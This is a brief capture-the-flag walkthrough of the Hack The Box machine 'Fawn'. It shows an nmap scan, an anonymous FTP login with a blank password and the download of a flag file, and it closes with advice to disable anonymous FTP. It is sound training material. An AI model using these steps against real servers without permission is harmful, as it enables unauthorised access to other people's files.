---
title: "Hack The Box: Fawn"
symbol: "Fw"
category: "Machines"
readTime: 2
tldr: "Discovering FTP on port 21, authenticating as anonymous with a blank password, and downloading files."
red: "Connect to FTP port 21 as 'anonymous', list files, and download sensitive files using the 'get' command."
blue: "Disable anonymous FTP authentication in vsftpd.conf and migrate to secure SFTP."
next: "dancing"
---

### Machine Overview
Fawn is the second target in Hack The Box's Starting Point series. It teaches the basics of FTP enumeration and demonstrates how anonymous access misconfigurations expose files.

### Step 1: Port Scanning
We scan the target using Nmap:
```bash
nmap -sV <target_ip>
```
Nmap identifies port 21 open:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```
The daemon is `vsftpd 3.0.3` running on port 21.

### Step 2: Testing Anonymous Login
Many FTP servers are configured to permit public, unauthenticated access. We connect using the `ftp` command-line client:
```bash
ftp <target_ip>
Connected to <target_ip>.
220 (vsftpd 3.0.3)
Name (<target_ip>:kavy): anonymous
331 Please specify the password.
Password: <press Enter>
230 Login successful.
```
The server confirms `230 Login successful`. Anonymous login is enabled.

### Step 3: Extracting Files
Once connected to the FTP shell, we list available files:
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

In an FTP shell, you cannot directly read a file using `cat`. You must download it to your local machine using `get`:
```bash
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
ftp> bye
```

On our local attack system, we inspect the downloaded file:
```bash
cat flag.txt
```
The challenge flag is displayed.

### Key takeaway
Anonymous FTP access should never be enabled on internal or production servers. If file transfers are required, mandate individual user authentication over encrypted SFTP.
